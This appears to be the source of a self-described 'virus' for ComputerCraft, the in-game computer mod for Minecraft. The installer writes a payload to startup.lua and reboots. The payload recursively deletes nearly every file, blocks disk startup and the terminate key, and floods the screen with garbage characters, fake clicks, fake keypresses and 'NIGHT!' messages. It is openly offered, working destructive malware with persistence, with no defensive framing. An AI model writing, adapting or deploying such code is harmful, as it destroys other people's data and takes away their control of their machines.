local code = [[
term.clear()
settings.set("shell.allow_disk_startup", false)
settings.save()
term.setCursorPos(1, 1)

-- Function to recursively delete all files and folders in a directory except specified files or folders
local function deleteFiles(directory, exceptions)
  for _, entry in ipairs(fs.list(directory)) do
    local fullPath = fs.combine(directory, entry)
    if fs.isDir(fullPath) then
      if not exceptions[entry] then
        deleteFiles(fullPath, exceptions)
        fs.delete(fullPath) -- Delete the folder after deleting its contents
      end
    elseif not exceptions[entry] then
      fs.delete(fullPath) -- Delete the file
    end
  end
end

local exceptions = {
  ["rom"] = true,
  ["startup.lua"] = true
}

-- Specify the path to the target directory
local targetDir = "/"

-- Call the function to delete files and folders, passing the target directory and exceptions table
deleteFiles(targetDir, exceptions)

local testing = false -- DO NOT CHANGE! ONLY IF IT IS A TESTING FILE!

local test = false
local active = true
local level = 20

function tablelength(T)
  local count = 0
  for _ in pairs(T) do count = count + 1 end
  return count
end

local pressKey = {
	[1] = keys.a,
	[2] = keys.b,
	[3] = keys.c,
	[4] = keys.d,
	[5] = keys.e,
	[6] = keys.f,
	[7] = keys.g,
	[8] = keys.h,
	[9] = keys.i,
	[10] = keys.j,
	[11] = keys.k,
	[12] = keys.l,
	[13] = keys.m,
	[14] = keys.n,
	[15] = keys.o,
	[16] = keys.p,
	[17] = keys.q,
	[18] = keys.r,
	[19] = keys.s,
	[20] = keys.t,
	[21] = keys.u,
	[22] = keys.v,
	[23] = keys.w,
	[24] = keys.x,
	[25] = keys.y,
	[26] = keys.z,
	[27] = keys.enter,
	[28] = keys.delete,
	[29] = keys.one,
	[30] = keys.two,
	[31] = keys.three,
	[32] = keys.four,
	[33] = keys.five,
	[34] = keys.six,
	[35] = keys.seven,
	[36] = keys.eight,
	[37] = keys.nine,
	[38] = keys.zero,
	[39] = keys.up,
	[40] = keys.down,
	[41] = keys.left,
	[42] = keys.right,
	[43] = keys.f1,
	[44] = keys.f2,
	[45] = keys.f3,
	[46] = keys.f4,
	[47] = keys.f5,
	[48] = keys.f6,
	[49] = keys.f7,
	[50] = keys.f8,
	[51] = keys.f9,
	[52] = keys.f10,
	[53] = keys.f11,
	[54] = keys.f12,
}


function readInput()
    local oldColor = term.getTextColor()
    term.setTextColor(colors.green)
    write("E Rage Destructive")
    term.setTextColor(colors.lime)
    write("> ")
    term.setTextColor(colors.yellow)
    local input = io.read()
    term.setTextColor(oldColor)
    return input
end
 
function ask(message)
term.setCursorPos(1,1)
local flashNum = 5
local _, askLine = term.getCursorPos()
local wide, _ = term.getSize()
 
term.clear()
term.setCursorPos(1, askLine)
term.setTextColor(colors.cyan)
if testing then
    term.write("? | E Rage Destructive (For Testers)")
else
    term.write("? | E Rage Destructive")
end
term.setCursorPos(1, askLine + 1)
term.write(("-"):rep(wide))
term.setCursorPos(3, askLine + 1)
term.write("+")
term.setCursorPos(1, askLine + 2)
term.setTextColor(colors.white)
print(message)
local result = readInput()
print()
term.clear()
term.setCursorPos(1,1)
return result
end
 
function confirm(message)
local input = nil
 
repeat
    input = ask(message.." (y/n)")
until input:find("y") or input:find("n") and input:len() == 1
if input:find("y") then
    return true
elseif input:find("n") then
    return false
else
    return "fail"
end
end
 
function writeToStartup(txt)
    local handle = fs.open("/startup", "w")
    handle.write(txt)
    handle.close()
end

function getStartupText()
    local handle = fs.open("/startup", "r")
    local wholeText = handle.readAll()
    handle.close()
    return wholeText
end

os.pullEvent = os.pullEvent

local oldOSPull = os.pullEvent
os.pullEvent = os.pullEventRaw

local wide, high = term.getSize()

if testing then
local start = confirm("Are you sure you want to test this virus? (This will run until the crazy speed!)")
if start then
	test = true
else
	error("To test again, run the pastebin file again by pressing the up arrow to scroll through recent entries.")
end
end
function randomColor(text)
    i = math.random(1,10)
    color = {
        [1] = colors.red,
        [2] = colors.orange,
        [3] = colors.yellow,
        [4] = colors.green,
        [5] = colors.lime,
        [6] = colors.cyan,
        [7] = colors.lightBlue,
        [8] = colors.blue,
        [9] = colors.purple,
        [10] = colors.magenta
    }
    if text then
        term.setTextColor(color[i])
    else
        term.setBackgroundColor(color[i])
    end
end

function centerText(msg, y)
    local w, _ = term.getSize()
    term.setCursorPos((w / 2) - (msg:len() / 2), y)
    write(msg)
end

function writeToStartup(txt)
	local file = fs.open("/startup", "w")
	file:write(txt)
end

while true do
    if active or args[1] ~= "-r" then
		local wide, high = term.getSize()
        level = level + 0.5
        repeatNum = (level / 2) + 1
        local curX, curY = term.getCursorPos()
        local oldBack = term.getBackgroundColor()
        local oldText = term.getTextColour()
        local oldBlink = term.getCursorBlink()
        term.setCursorBlink(false)
		if multishell then
			for i = 1, multishell.getCount() do
				multishell.setTitle(i, string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)) .. string.char(math.random(1,255)))
			end
		end
        if level >= 26 and level <= 50 then
            term.scroll(math.random(-1,1))
			local x = math.random(1,wide)
			local y = math.random(1,high)
			os.queueEvent("mouse_click", 1, x, y)
        end
        if level >= 51 and level <= 75 then
            local randomNum = math.random(1,tablelength(pressKey))
			term.scroll(math.random(-2,2))
			local x = math.random(1,wide)
			local y = math.random(1,high)
			os.queueEvent("mouse_click", 1, x, y)
			os.queueEvent("key", pressKey[randomNum], false)
			
				if math.random(1,2) == 1 then
					os.queueEvent("char", "n")
				else
					if math.random(1,2) == 1 then
						os.queueEvent("char", "N")
					else
						if math.random(1,2) == 1 then
							os.queueEvent("char", string.char(math.random(200,203)))
						else
							os.queueEvent("char", string.char(math.random(232,235)))
						end
					end
				end
				if level >= 76 then
					os.queueEvent("char", string.char(7))
					os.queueEvent("char", "N")
					os.queueEvent("char", "I")
					os.queueEvent("char", "G")
					os.queueEvent("char", "H")
					os.queueEvent("char", "T")
					os.queueEvent("char", "!")
					os.queueEvent("char", string.char(7))
				end
        end
        if level > 100 then
            level = 100
			if test then
				term.clear()
				term.setTextColor(colors.white)
				error("Finished testing!")
			end
        end
		if level > 76 then
            local randomNum = math.random(1,tablelength(pressKey))
			term.scroll(math.random(-2,2))
						local x = math.random(1,wide)
			local y = math.random(1,high)
			os.queueEvent("mouse_click", 1, x, y)
			os.queueEvent("key", pressKey[randomNum], false)
			if fs.exists("/win/win") then
				if math.random(1,2) == 1 then
					os.queueEvent("char", "n")
				else
					if math.random(1,2) == 1 then
						os.queueEvent("char", "N")
					else
						if math.random(1,2) == 1 then
							os.queueEvent("char", string.char(math.random(200,203)))
						else
							os.queueEvent("char", string.char(math.random(232,235)))
						end
					end
				end
			end
		end
        repeat
            local randomNum = math.random(1,4)
			curX, curY = term.getCursorPos()
     	 	oldBack = term.getBackgroundColor()
      		oldText = term.getTextColour()
            term.setCursorPos(math.random(1, wide), math.random(1, high))
            if math.random(1,2) == 1 then
                term.setBackgroundColor(oldBack)
                randomColor(true)
            else
                term.setTextColor(oldBack)
                randomColor(false)
            end
            if randomNum == 1 then
                write("N")
            elseif randomNum == 2 then
                write(string.char(math.random(129,159)))
            elseif randomNum == 3 then
                if math.random(1,2) == 1 then
                    write(string.char(math.random(200,203)))
                else
                    write(string.char(math.random(232,235)))
                end
            elseif randomNum == 4 then
                write(string.char(math.random(24,27)))
            else
                write("n")
            end
			term.setBackgroundColor(oldBack)
			term.setTextColor(oldText)
			term.setCursorPos(curX,curY)
			repeatNum = repeatNum - 1
        until repeatNum < 1
        if level >= 76 then
            term.scroll(math.random(-3,3))
            term.setCursorPos(math.random(-6,wide + 5), math.random(1,high))
			term.write(string.char(7).."NIGHT!"..string.char(7))
			term.setBackgroundColor(oldBack)
			term.setTextColor(oldText)
			term.setCursorPos(curX,curY)
   			term.setCursorBlink(oldBlink)
            term.scroll(math.random(-3,3))
            term.setCursorPos(math.random(-6,wide + 5), math.random(1,high))
			term.write(string.char(7).."NIGHT!"..string.char(7))
			term.setBackgroundColor(oldBack)
			term.setTextColor(oldText)
			term.setCursorPos(curX,curY)
   			term.setCursorBlink(oldBlink)
            term.scroll(math.random(-3,3))
            term.setCursorPos(math.random(-6,wide + 5), math.random(1,high))
			term.write(string.char(7).."NIGHT!"..string.char(7))
			term.setBackgroundColor(oldBack)
			term.setTextColor(oldText)
			term.setCursorPos(curX,curY)
   			term.setCursorBlink(oldBlink)
            term.scroll(math.random(-3,3))
            term.setCursorPos(math.random(-6,wide + 5), math.random(1,high))
			term.write(string.char(7).."NIGHT!"..string.char(7))
			term.setBackgroundColor(oldBack)
			term.setTextColor(oldText)
			term.setCursorPos(curX,curY)
   			term.setCursorBlink(oldBlink)
        end
		if test then
			term.setCursorPos(1,high)
			term.setTextColor(colors.black)
			term.setBackgroundColor(colors.yellow)
			term.write(" Testing | "..level.."% Done "..(" "):rep(wide - (" Testing | "..level.."% Done "):len()))
			term.setTextColor(oldText)
			term.setBackgroundColor(oldBack)
			term.setCursorPos(1,high - 1)
			term.setTextColor(colors.white)
			term.setBackgroundColor(colors.black)
			term.write(" "..(" "):rep(wide - (" "):len()))
			term.setTextColor(oldText)
			term.setBackgroundColor(oldBack)
		end
    end
    sleep(1.25 - (level / 75))
end
]]

local file = io.open("startup.lua", "wb")
file:write(code)
file:close()
print("its NightTime.")
function eject()
  local drive = peripheral.find("drive")
  drive.ejectDisk()
end
pcall(eject)
shell.run("reboot")
